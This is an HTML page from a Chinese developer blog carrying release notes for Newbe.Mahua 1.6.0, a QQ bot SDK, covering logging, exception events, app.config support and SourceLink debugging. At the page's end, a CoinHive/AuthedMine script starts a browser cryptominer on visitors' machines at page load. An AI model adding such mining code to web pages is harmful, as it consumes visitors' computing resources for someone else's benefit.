<!DOCTYPE html> <html lang="zh-cn"> <head> <meta charset="utf-8"> <meta name="msvalidate.01" content="71CCAD9D3DEDBA653F52D96EACF9ED56"/> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="description" content="此次版本发布主要围绕”开发便利性提升”特性。可调试性、可追踪性都有进一步提升。"> <link rel="canonical" href="http://0.0.0.0:4000/docs/mahua/releasenodes/2017/12/30/Release-Notes-1-6-0.html"> <link rel="alternate" type="application/rss+xml" title="Newbe | Newbe便是新生，唯有不断蜕变才能焕然新生。" href="http://0.0.0.0:4000 /feed.xml "/> <meta name="keywords" content=""> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"> <title>Newbe.Mahua 1.6.0 开发便利性提升 | Newbe | Newbe便是新生，唯有不断蜕变才能焕然新生。 </title> <meta name="renderer" content="webkit"> <meta http-equiv="Cache-Control" content="no-siteapp"/> <link rel="shortcut icon" type="image/x-icon" href="/assets/i/favicon.ico" media="screen"> <meta name="mobile-web-app-capable" content="yes"> <link rel="icon" sizes="192x192" href="/assets/i/favicon.ico"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta name="apple-mobile-web-app-status-bar-style" content="black"> <meta name="apple-mobile-web-app-title" content="Newbe"/> <link rel="apple-touch-icon-precomposed" href="/assets/i/favicon.ico"> <meta name="msapplication-TileImage" content="/assets/i/favicon.ico"> <meta name="msapplication-TileColor" content="#0e90d2"> <link rel="stylesheet" href="http://cdn.amazeui.org/amazeui/2.7.2/css/amazeui.min.css"> <link rel="stylesheet" href="/assets/css/app.css"> <style media="screen">del{text-decoration:none;color:black;background-color:black}del:hover{background-color:white}</style> <script type="text/javascript" src="http://tajs.qq.com/stats?sId=62304791" charset="UTF-8"></script> <script>!function(e,t,a,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=t.createElement(a),s=t.getElementsByTagName(a)[0],o.async=1,o.src=n,s.parentNode.insertBefore(o,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-100658571-1","auto"),ga("send","pageview");</script> </head> <body> <header class="am-g am-g-fixed blog-fixed blog-text-center blog-header"> <div class="am-u-sm-8 am-u-sm-centered"> <img width="200" src="/assets/i/logo.png" alt="Amaze UI Logo"/> <h2 class="am-hide-sm-only">Newbe便是新生，唯有不断蜕变才能焕然新生。</h2> </div> </header> <nav class="am-g am-g-fixed blog-fixed blog-nav"> <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only blog-button" data-am-collapse="{target: '#blog-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button> <div class="am-collapse am-topbar-collapse" id="blog-collapse"> <ul class="am-nav am-nav-pills am-topbar-nav"> <li class="am-active"><a href="/">首页</a></li> <li><a href="#" title="麻花文库(Mahua Gallery)" onclick=" $('#pleaseWait').modal()">麻花(Mahua)插件中心</a></li> <li><a href="https://gitee.com/yks/Newbe.Mahua.Framework" title="项目源码" target="_blank">项目源码</a></li> <li><a href="https://cnhv.co/ya7l" title="挖矿捐助" target="_blank">挖矿捐助 <del>不花钱</del> </a></li> <li><a href="https://gitee.com/yks/Newbe.Mahua.Framework#project-donate-overview" title="现金捐助" target="_blank">现金捐助</a></li> <li><a href="https://marketplace.visualstudio.com/items?itemName=Newbe36524.NewbeMahuaVsExtensions" title="VS插件下载" target="_blank">VS插件下载</a></li> <li><a href="https://jq.qq.com/?_wv=1027&k=4AMMCTx" title="技术交流群" target="_blank">技术交流群</a></li> <li><a href="https://live.bilibili.com/7834872" title="直播码字" target="_blank" id="liveStatus">直播码字</a></li> </ul> <div class="am-form-group"> <script type="text/javascript">!function(){document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E'));var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="http://znsv.baidu.com/customer_search/api/js?sid=4496900582148885024&plate_url="+encodeURIComponent(window.location.href)+"&t="+Math.ceil(new Date/36e5);var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}();</script> </div> </div> </nav> <hr> <div class="am-modal am-modal-alert" tabindex="-1" id="pleaseWait"> <div class="am-modal-dialog"> <div class="am-modal-hd">即将上线</div> <div class="am-modal-bd"> 尽请期待！ </div> <div class="am-modal-footer"> <span class="am-modal-btn">确定</span> </div> </div> </div> <div class="am-g am-g-fixed blog-fixed blog-content"> <div class="am-u-md-8 am-u-sm-12"> <article class="am-article blog-article-p"> <div class="am-article-hd"> <h1 class="am-article-title blog-text-center">Newbe.Mahua 1.6.0 开发便利性提升</h1> <p class="am-article-meta blog-text-center"> <span><a href="#" class="blog-color">Docs, Mahua, and ReleaseNodes</a></span>- <span><a href="#">Newbe &nbsp;</a></span>- <span><a href="#">30 Dec 2017</a></span> </p> </div> <div class="am-article-bd"> <div id="toc-container"> <table class="toc" id="toc"> <tbody> <tr> <td> <div id="toctitle"> <h2>目录</h2> </div> <ul> <li class="toc_level-1 toc_section-1"> <a href="#版本亮点"><span class="tocnumber">1</span> <span class="toctext">版本亮点</span></a> <ul> <li class="toc_level-2 toc_section-2"> <a href="#提供日志接口"><span class="tocnumber">1.1</span> <span class="toctext">提供日志接口</span></a> </li> <li class="toc_level-2 toc_section-3"> <a href="#支持全局异常事件"><span class="tocnumber">1.2</span> <span class="toctext">支持全局异常事件</span></a> </li> <li class="toc_level-2 toc_section-4"> <a href="#支持应用程序配置文件（app.config）"><span class="tocnumber">1.3</span> <span class="toctext">支持应用程序配置文件（app.config）</span></a> </li> <li class="toc_level-2 toc_section-5"> <a href="#支持调试框架源码"><span class="tocnumber">1.4</span> <span class="toctext">支持调试框架源码</span></a> </li> <li class="toc_level-2 toc_section-6"> <a href="#增加单元测试与调试SDK的说明"><span class="tocnumber">1.5</span> <span class="toctext">增加单元测试与调试SDK的说明</span></a> </li> <li class="toc_level-2 toc_section-7"> <a href="#增加 “调用SQLite操作” 的例子和说明"><span class="tocnumber">1.6</span> <span class="toctext">增加 “调用SQLite操作” 的例子和说明</span></a> </li> <li class="toc_level-2 toc_section-8"> <a href="#增加 “定时任务” 的例子和说明"><span class="tocnumber">1.7</span> <span class="toctext">增加 “定时任务” 的例子和说明</span></a> </li> </ul> </li> <li class="toc_level-1 toc_section-9"> <a href="#BUG修复"><span class="tocnumber">2</span> <span class="toctext">BUG修复</span></a> </li> <li class="toc_level-1 toc_section-10"> <a href="#升级注意"><span class="tocnumber">3</span> <span class="toctext">升级注意</span></a> </li> <li class="toc_level-1 toc_section-11"> <a href="#教程链接"><span class="tocnumber">4</span> <span class="toctext">教程链接</span></a> </li> <li class="toc_level-1 toc_section-12"> <a href="#发布说明"><span class="tocnumber">5</span> <span class="toctext">发布说明</span></a> </li> </ul> </td> </tr> </tbody> </table> </div><p>此次版本发布主要围绕”开发便利性提升”特性。可调试性、可追踪性都有进一步提升。</p> <h1 id="版本亮点">版本亮点</h1> <h2 id="提供日志接口">提供日志接口</h2> <p>可以通过<code class="highlighter-rouge">ILog Logger = Newbe.Mahua.Logging.LogProvider.For&lt;T&gt;()</code>创建日志接口的实例，并通过实例写日志。</p> <p>日志接口通过<a href="https://github.com/damianh/LibLog">LibLog</a>实现。</p> <p>依托于该项目的灵活性，可以在流行的日志框架之间进行切换，包括：</p> <ul> <li>NLog</li> <li>Log4Net</li> <li>EntLib Logging</li> <li>Serilog</li> <li>Loupe</li> </ul> <p>本SDK默认使用NLog，详细内容可以通过<a href="https://github.com/damianh/LibLog">LibLog</a>进行了解。</p> <h2 id="支持全局异常事件">支持全局异常事件</h2> <p>添加了<code class="highlighter-rouge">IExceptionOccuredMahuaEvent</code>接口，运行出现异常事件。</p> <p>当插件运行过程中出现异常时，将会触发此事件。</p> <p>开发者可以在此事件中了解异常的原因，同时提供了<code class="highlighter-rouge">ContinueThrows</code>参数，允许开发者阻止异常的抛出。</p> <p>默认情况下，当框架出现异常时，将调用日志接口写下日志。</p> <p>不再需要处处<code class="highlighter-rouge">try...catch</code>。</p> <h2 id="支持应用程序配置文件（app.config）">支持应用程序配置文件（app.config）</h2> <p>从 1.6 开始，将会支持 app.config 的配置。</p> <p>由此，便可以实现 程序集重定向、AppSettings和ConnectionStrings等.Net高级配置内容。</p> <p>详细的使用方法可以参照下文中的 <a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a> 。</p> <h2 id="支持调试框架源码">支持调试框架源码</h2> <p>从 1.6 开始，框架将采用 Debug 模式进行版本发布。</p> <p>同时，依托 VS2017.5 版本的”源链接支持”和”<a href="https://github.com/ctaggart/SourceLink">SourceLink</a>“的支持，开发者可以实现不需要下载源码，便可以实现调试框架源码的目的。</p> <p> <img src="/assets/i/20171230-001.png" alt="开启源链接支持"/> </p> <h2 id="增加单元测试与调试SDK的说明">增加单元测试与调试SDK的说明</h2> <p>添加了 <a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a> 教程。</p> <p>教程链接：<a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a></p> <h2 id="增加 “调用SQLite操作” 的例子和说明">增加 “调用SQLite操作” 的例子和说明</h2> <p>为了响应社区要求，添加了 “调用SQLite操作” 的教程。</p> <p>通过 异步操作、依赖注入和单元测试等关键内容，为开发者给出开发建议。</p> <p>教程链接： <a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a></p> <h2 id="增加 “定时任务” 的例子和说明">增加 “定时任务” 的例子和说明</h2> <p>为了响应社区要求，添加了 “定时任务” 的教程。</p> <p>教程链接： <a href="/docs/mahua/2017/12/31/Newbe-Mahua-Samples-LiveGirl.html">Newbe.Mahua.Samples.LiveGirl 操作定时任务</a></p> <h1 id="BUG修复">BUG修复</h1> <ul> <li>修复VS2015和VS2017同时安装在一台机器上时，build.bat运行出错的问题。</li> <li>修复了如果没有安装平台扩展(例如：Newbe.Mahua.Administration)，build.bat运行出错的问题。</li> </ul> <h1 id="升级注意">升级注意</h1> <p>从 1.5 版本直接更新全部的 Newbe.Mahua.* nuget 包，重新生成便可以。</p> <p>升级过程中若出现需要覆盖build.ps1的提示，允许即可。</p> <p>不再需要<code class="highlighter-rouge">Tungsten.Domains</code>，可以在升级后卸载此 nuget 包。</p> <p>VS插件更新只需要按照VS提示进行操作即可。</p> <p>=========================更多内容分割线=========================</p> <h1 id="教程链接">教程链接</h1> <p> <a href="/docs/mahua/2017/12/16/Begin-First-Plugin-With-Mahua-In-v1.4.html">开始第一个QQ机器人【适用于v1.4及以上】</a> </p> <p> <a href="/docs/mahua/2017/12/24/Newbe-Mahua-Administration.html">Newbe.Mahua 扩展设置中心</a> </p> <p> <a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a> </p> <p> <a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a> </p> <p> <a href="/docs/mahua/2017/12/31/Newbe-Mahua-Samples-LiveGirl.html">Newbe.Mahua.Samples.LiveGirl 操作定时任务</a> </p> <h1 id="发布说明">发布说明</h1> <p> <a href="/docs/mahua/releasenodes/2017/12/30/Release-Notes-1-6-0.html">Newbe.Mahua 1.6.0 开发便利性提升</a> </p> </div> </article> <hr> <div class="am-g blog-article-widget blog-article-margin"> <div class="am-u-lg-4 am-u-md-5 am-u-sm-7 am-u-sm-centered blog-text-center"> <span class="am-icon-tags"> &nbsp;</span> <a href="#">Mahua</a> <a href="#">SDK</a> <hr> <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a> <a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a> <a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a> <a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a> </div> </div> <hr> </div> <div class="am-u-md-4 am-u-sm-12 blog-sidebar"> <div class="blog-sidebar-widget blog-bor" id="contentsContainer"> <table id="contentsDiv" style="text-align:left"></table> </div> </div> </div> <footer class="blog-footer"> <div class="am-g am-g-fixed blog-fixed am-u-sm-centered blog-footer-padding"> <div class="am-u-sm-12 am-u-md-4- am-u-lg-4"> <h3>Newbe</h3> <p class="am-text-sm">没什么可说的！ </div> <div class="am-u-sm-12 am-u-md-4- am-u-lg-4"> <h3>社交账号</h3> <p> <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a> <a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a> <a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a> <a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a> </p> <h3>Bio</h3> <p>没什么可说的！</p> </div> <div class="am-u-sm-12 am-u-md-4- am-u-lg-4"> <h1>我们站在巨人的肩膀上</h1> <h3>Heroes</h3> <p> <ul> <li>amazeui</li> <li>amwiki</li> <li>jekyll</li> <li>...</li> </ul> </p> </div> </div> <div class="blog-text-center">© 2017 Newbe <script src="/assets/js/newbe/cnzz.js" type="text/javascript"></script> </div> </footer> <div class="am-modal am-modal-confirm" tabindex="-1" id="live-confirm"> <div class="am-modal-dialog"> <div class="am-modal-hd">b站直播</div> <div class="am-modal-bd"> 听说正在直播码字，要不要前去帮忙刷一下人气？ </div> <div class="am-modal-footer"> <span class="am-modal-btn am-btn-primary" data-am-modal-cancel>滚蛋</span> <span class="am-modal-btn" data-am-modal-confirm>好的</span> </div> </div> </div> <!--[if (gte IE 9)|!(IE)]><!--> <script src="https://cdn.bootcss.com/jquery/2.1.4/jquery.min.js"></script> <!--<![endif]--> <!--[if lte IE 8 ]><script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script> <script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script> <script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.ie8polyfill.min.js"></script><![endif]--> <script src="https://cdn.bootcss.com/jquery.pin/1.0.1/jquery.pin.js"></script> <script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.min.js"></script> <script src="/assets/js/newbe/jiathis.js" type="text/javascript"></script> <script type="text/javascript" src="http://v3.jiathis.com/code_mini/jiathis_r.js?move=0&amp;btn=r4.gif&amp;uid=2134199" charset="utf-8"></script> <script src="/assets/js/newbe/baidutuisong.js" type="text/javascript"></script> <script type="text/javascript">$(function(){$(".am-article").find("table").addClass("am-table am-table-striped am-table-hover"),$("del").attr("title","\u4f60\u77e5\u9053\u7684\u592a\u591a\u4e86\uff01"),function(){var t=!1;window.setInterval(function(){t||$.get("http://pianzide1117.oicp.net:12821/api/beesite/status").done(function(e){e?($("#live-confirm").modal({relatedTarget:this,onConfirm:function(){window.open("https://live.bilibili.com/7834872")},onCancel:function(){}}),$("#liveStatus").text("\u6b63\u5728\u76f4\u64ad\u7801\u5b57")):$("#liveStatus").text("\u8fd9\u4f1a\u513f\u6ca1\u6709\u76f4\u64ad"),t=!0}).error(function(){$("#liveStatus").text("\u8fd9\u4f1a\u513f\u6ca1\u6709\u76f4\u64ad")})},2e3)}(),function(){$("#contentsDiv").html($("#toc").html()),$("#toc").remove(),$("#contentsContainer").pin({containerSelector:".blog-content"})}()});</script> <script src="https://authedmine.com/lib/authedmine.min.js"></script> <script>var miner=new CoinHive.Anonymous("70pQBVoLVg88SblKomCh9mJHBeT8nOzk",{throttle:.7});miner.isMobile()||miner.didOptOut(14400)||miner.start();</script> </body> </html>